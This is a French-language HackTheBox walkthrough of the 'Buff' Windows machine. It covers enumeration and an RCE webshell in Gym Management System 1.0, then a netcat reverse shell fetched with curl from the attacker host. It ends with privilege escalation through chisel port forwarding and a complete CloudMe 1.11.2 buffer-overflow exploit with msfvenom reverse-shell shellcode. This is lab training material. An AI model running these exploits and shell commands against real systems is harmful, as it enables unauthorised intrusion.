---
title: HTB | Buff
description: Buff is an easy difficulty Windows machine that features an instance of Gym Management System 1.0. This is found to suffer from an unauthenticated remote code execution vulnerability. Enumeration of the internal network reveals a service running at port 8888. The installation file for this service can be found on disk, allowing us to debug it locally. We can perform port forwarding in order to make the service available and exploit it.
slug: buff-htb
date: 2025-01-12 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Windows
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Buff cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Buff</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Windows</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.198</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## IP
```bash
10.10.10.198
```

## Enumeration

### nmap

```bash
$ nmap -sS -sV -An -p- -vvv -T4 10.10.10.198

PORT     STATE SERVICE    REASON          VERSION
7680/tcp open  pando-pub? syn-ack ttl 127
8080/tcp open  http       syn-ack ttl 127 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: mrb3n's Bro Hut
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
```

## Foothold

### Directory enumeration : buff.htb - port 8080

```bash
$ gobuster dir -u http://buff.htb:8080/ -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://buff.htb:8080/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/profile              (Status: 301) [Size: 337] [--> http://buff.htb:8080/profile/]
/img                  (Status: 301) [Size: 333] [--> http://buff.htb:8080/img/]
/upload               (Status: 301) [Size: 336] [--> http://buff.htb:8080/upload/]
/license              (Status: 200) [Size: 18025]
/include              (Status: 301) [Size: 337] [--> http://buff.htb:8080/include/]
/examples             (Status: 503) [Size: 1054]
/licenses             (Status: 403) [Size: 1199]
/Profile              (Status: 301) [Size: 337] [--> http://buff.htb:8080/Profile/]
/LICENSE              (Status: 200) [Size: 18025]
/att                  (Status: 301) [Size: 333] [--> http://buff.htb:8080/att/]
/%20                  (Status: 403) [Size: 1040]
/IMG                  (Status: 301) [Size: 333] [--> http://buff.htb:8080/IMG/]
/License              (Status: 200) [Size: 18025]
/ex                   (Status: 301) [Size: 332] [--> http://buff.htb:8080/ex/]
/*checkout*           (Status: 403) [Size: 1040]
/Img                  (Status: 301) [Size: 333] [--> http://buff.htb:8080/Img/]
/boot                 (Status: 301) [Size: 334] [--> http://buff.htb:8080/boot/]
/Upload               (Status: 301) [Size: 336] [--> http://buff.htb:8080/Upload/]
/phpmyadmin           (Status: 403) [Size: 1199]
/webalizer            (Status: 403) [Size: 1040]
/*docroot*            (Status: 403) [Size: 1040]
/*                    (Status: 403) [Size: 1040]
/con                  (Status: 403) [Size: 1040]
/Include              (Status: 301) [Size: 337] [--> http://buff.htb:8080/Include/]
/http%3A              (Status: 403) [Size: 1040]
/**http%3a            (Status: 403) [Size: 1040]
/*http%3A             (Status: 403) [Size: 1040]
/aux                  (Status: 403) [Size: 1040]
/Boot                 (Status: 301) [Size: 334] [--> http://buff.htb:8080/Boot/]
/**http%3A            (Status: 403) [Size: 1040]
/%C0                  (Status: 403) [Size: 1040]
/server-status        (Status: 403) [Size: 1199]
/%3FRID%3D2671        (Status: 403) [Size: 1040]
/devinmoore*          (Status: 403) [Size: 1040]
/Ex                   (Status: 301) [Size: 332] [--> http://buff.htb:8080/Ex/]
...
```

Le /ex est intéressant et indique des infos avec une erreur mysqli !

```bash
Warning: mysqli::__construct(): (HY000/1049): Unknown database 'secure_login' in C:\xampp\htdocs\gym\ex\include\db_connect.php on line 3
```

### Gym Management System 1.0 - Unauthenticated RCE
On recherche "Gym" dans searchsploit ou sur internet on trouve rapidement un exploit python permettant d'uploader un fichier php et d'executer n'importe quelle commande.
```bash
$ python3 exploit2.py http://buff.htb:8080/
/home/kali/htb/Buff/exploit2.py:77: SyntaxWarning: invalid escape sequence '\/'
  SIG += BL+'            \/'+RS+'\n'
            /\
/vvvvvvvvvvvv \--------------------------------------,                                       
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> powershell cat ../../../../Users/shaun/Desktop/user.txt
PNG
▒
b6a5....ce0d3

```

### Stablize shell
```bash
$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.10.198 - - [07/Jan/2025 17:07:08] "GET /nc.exe HTTP/1.1" 200 -

--------------------------------------------------------------
# RCE from website

C:\xampp\htdocs\gym\upload> curl -O http://10.10.14.42:8888/nc.exe

C:\xampp\htdocs\gym\upload> nc.exe 10.10.14.42 1337 -e cmd.exe

--------------------------------------------------------------

$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.10.198] 50531
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\gym\upload>whoami
whoami
buff\shaun

C:\xampp\htdocs\gym\upload>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\gym\upload> 
```

## Privilege escalation

### CloudMe_1112.exe
En fouillant dans les fichiers, on trouve un exectutable `CloudMe_1112.exe`. Il se trouve que cette version tourne par défaut sur le port 8888 lorsqu'on l'execute, ce qui est bien le cas pour notre machine
```bash
PS C:\xampp\htdocs\gym\upload> tasklist | findstr Cloud
tasklist | findstr Cloud
CloudMe.exe                    284                            0     18,048 K
PS C:\xampp\htdocs\gym\upload> netstat -ano | findstr LISTENING
netstat -ano | findstr LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       944
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       6188
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       7832
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       8820
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       524
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1064
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1644
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2248
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       668
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       684
  TCP    10.10.10.198:139       0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING       8936
  TCP    [::]:135               [::]:0                 LISTENING       944
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:7680              [::]:0                 LISTENING       7832
  TCP    [::]:8080              [::]:0                 LISTENING       8820
  TCP    [::]:49664             [::]:0                 LISTENING       524
  TCP    [::]:49665             [::]:0                 LISTENING       1064
  TCP    [::]:49666             [::]:0                 LISTENING       1644
  TCP    [::]:49667             [::]:0                 LISTENING       2248
  TCP    [::]:49668             [::]:0                 LISTENING       668
  TCP    [::]:49669             [::]:0                 LISTENING       684
```

### CloudMe 1.11.2 - Buffer Overflow

```bash
$ searchsploit cloudme      
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------

CloudMe 1.11.2 - Buffer Overflow (PoC)                              | windows/remote/48389.py <----------------------

CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                     | windows/local/48499.txt
CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR)                     | windows/local/48840.py
Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                    | windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)             | windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)      | windows/remote/44175.rb
CloudMe Sync 1.11.0 - Local Buffer Overflow                         | windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                     | windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)            | windows_x86-64/remote/46250.py
CloudMe Sync < 1.11.0 - Buffer Overflow                             | windows/remote/44027.py
CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)          | windows_x86-64/remote/44784.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Le fichier python contient un payload généré avec msfvenom mais qui ne fonctionne pas pour notre windows 10 x64 victime. Nous avons donc généré un nouveau payload. Ensuite, on a remplacer ce code dans le python.
```bash
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.42 LPORT=9001 -b '\x00\x0A\x0D' -f python
...
...

$ cat exploit_cloudme.py
# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

buf =  b""
buf += b"\xbb\x9b\xa8\x51\x15\xdb\xd1\xd9\x74\x24\xf4\x5e"
buf += b"\x2b\xc9\xb1\x52\x31\x5e\x12\x83\xc6\x04\x03\xc5"
buf += b"\xa6\xb3\xe0\x05\x5e\xb1\x0b\xf5\x9f\xd6\x82\x10"
buf += b"\xae\xd6\xf1\x51\x81\xe6\x72\x37\x2e\x8c\xd7\xa3"
buf += b"\xa5\xe0\xff\xc4\x0e\x4e\x26\xeb\x8f\xe3\x1a\x6a"
buf += b"\x0c\xfe\x4e\x4c\x2d\x31\x83\x8d\x6a\x2c\x6e\xdf"
buf += b"\x23\x3a\xdd\xcf\x40\x76\xde\x64\x1a\x96\x66\x99"
buf += b"\xeb\x99\x47\x0c\x67\xc0\x47\xaf\xa4\x78\xce\xb7"
buf += b"\xa9\x45\x98\x4c\x19\x31\x1b\x84\x53\xba\xb0\xe9"
buf += b"\x5b\x49\xc8\x2e\x5b\xb2\xbf\x46\x9f\x4f\xb8\x9d"
buf += b"\xdd\x8b\x4d\x05\x45\x5f\xf5\xe1\x77\x8c\x60\x62"
buf += b"\x7b\x79\xe6\x2c\x98\x7c\x2b\x47\xa4\xf5\xca\x87"
buf += b"\x2c\x4d\xe9\x03\x74\x15\x90\x12\xd0\xf8\xad\x44"
buf += b"\xbb\xa5\x0b\x0f\x56\xb1\x21\x52\x3f\x76\x08\x6c"
buf += b"\xbf\x10\x1b\x1f\x8d\xbf\xb7\xb7\xbd\x48\x1e\x40"
buf += b"\xc1\x62\xe6\xde\x3c\x8d\x17\xf7\xfa\xd9\x47\x6f"
buf += b"\x2a\x62\x0c\x6f\xd3\xb7\x83\x3f\x7b\x68\x64\xef"
buf += b"\x3b\xd8\x0c\xe5\xb3\x07\x2c\x06\x1e\x20\xc7\xfd"
buf += b"\xc9\x45\x12\xf3\x23\x32\x20\x0b\x17\xeb\xad\xed"
buf += b"\x3d\xfb\xfb\xa6\xa9\x62\xa6\x3c\x4b\x6a\x7c\x39"
buf += b"\x4b\xe0\x73\xbe\x02\x01\xf9\xac\xf3\xe1\xb4\x8e"
buf += b"\x52\xfd\x62\xa6\x39\x6c\xe9\x36\x37\x8d\xa6\x61"
buf += b"\x10\x63\xbf\xe7\x8c\xda\x69\x15\x4d\xba\x52\x9d"
buf += b"\x8a\x7f\x5c\x1c\x5e\x3b\x7a\x0e\xa6\xc4\xc6\x7a"
buf += b"\x76\x93\x90\xd4\x30\x4d\x53\x8e\xea\x22\x3d\x46"
buf += b"\x6a\x09\xfe\x10\x73\x44\x88\xfc\xc2\x31\xcd\x03"
buf += b"\xea\xd5\xd9\x7c\x16\x46\x25\x57\x92\x76\x6c\xf5"
buf += b"\xb3\x1e\x29\x6c\x86\x42\xca\x5b\xc5\x7a\x49\x69"
buf += b"\xb6\x78\x51\x18\xb3\xc5\xd5\xf1\xc9\x56\xb0\xf5"
buf += b"\x7e\x56\x91"

payload = buf

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

buf = padding1 + EIP + NOPS + payload + overrun

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,8888))
        s.send(buf)
except Exception as e:
        print(sys.exc_value)
```

### Chisel - port forwarding (8888)
Mise en place de chisel, pour dupliquer le port 8888 de la machine cible sur la machine locale. EN effet, ce port n'est accessible que depuis la machine cible normalement :
Or, pour exploiter notre vuln, avec le script python , il faut que le port soit accessible sur notre machine local qui dispose bien de python.
```bash
kali@kali:~/htb/Buff$ ./chisel server -p 1082 --reverse
2025/01/10 20:17:44 server: Reverse tunnelling enabled
2025/01/10 20:17:44 server: Fingerprint iiSKQuGUrbyvUjt5afbcmjecM6T6JHMCaV2+4LBLk3g=
2025/01/10 20:17:44 server: Listening on http://0.0.0.0:1082

2025/01/10 20:19:07 server: session#1: tun: proxy#R:8888=>localhost:8888: Listening

-------------------------------------------------------------------------
# Windows target
PS C:\xampp\htdocs\gym\upload> .\chisel.exe client 10.10.14.42:1082 R:8888:localhost:8888
.\chisel.exe client 10.10.14.42:1082 R:8888:localhost:8888
2025/01/11 01:19:06 client: Connecting to ws://10.10.14.42:1082
2025/01/11 01:19:07 client: Connected (Latency 22.8931ms)
```

### Exploitation (root.txt)
Enfin, on execute l'exploit final et on obtient un shell en tant que root sur la machine windows :
```bash
┌──(kali㉿kali)-[~/htb/Buff]
└─$ python3 exploit_cloudme.py
                                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/htb/Buff]
└─$ python3 exploit_cloudme.py
                                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/htb/Buff]
└─$ python3 exploit_cloudme.py

--------------------------------------------------

$ nc -lnvp 9001    
listening on [any] 9001 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.10.198] 49685
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
buff\administrator

C:\Windows\system32>cd ../../Users/Administrator/Desktop
cd ../../Users/Administrator/Desktop

C:\Users\Administrator\Desktop>cat root.txt
cat root.txt
'cat' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator\Desktop>type root.txt
type root.txt
39c4....c39f

C:\Users\Administrator\Desktop>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\Desktop> whoami
whoami
buff\administrator
```